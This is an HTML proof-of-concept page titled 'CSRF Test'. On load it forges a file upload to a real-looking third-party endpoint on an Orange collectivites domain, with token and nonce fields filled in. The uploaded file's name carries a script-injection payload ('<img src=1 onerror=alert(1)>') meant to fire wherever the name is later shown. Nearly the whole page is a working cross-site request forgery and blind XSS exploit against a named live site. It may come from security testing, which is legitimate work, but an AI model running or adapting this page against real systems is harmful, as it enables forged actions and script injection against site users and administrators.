<html>
  <head>
    <title>CSRF Test</title>
    <script>
      function setFileName() {
        var inputFile = document.getElementById("fileInput");
        var dataTransfer = new DataTransfer(); 
        var file = new File(["haha"], "blind<img src=1 onerror=alert(1)>.svg", { type: "image/svg+xml" }); 
        dataTransfer.items.add(file); 
        inputFile.files = dataTransfer.files; 
      }

      window.onload = function() {
        setFileName(); 
        document.getElementById("csrfForm").submit(); 
      };
    </script>
  </head>
  <body>
    <h2>CSRF File Upload</h2>
    <form id="csrfForm" enctype="multipart/form-data" method="POST" action="https://redevances.collectivites.orange.com/confirmation-demande/">
      <input type="hidden" name="token" value="token_aPlUctyhaE">
      <input type="hidden" name="securite_nonce" value="716cd06816">
      <input type="file" id="fileInput" name="lefichier" value="ss">
      <br><br>
      <input type="submit" value="Click">
    </form>
  </body>
</html>
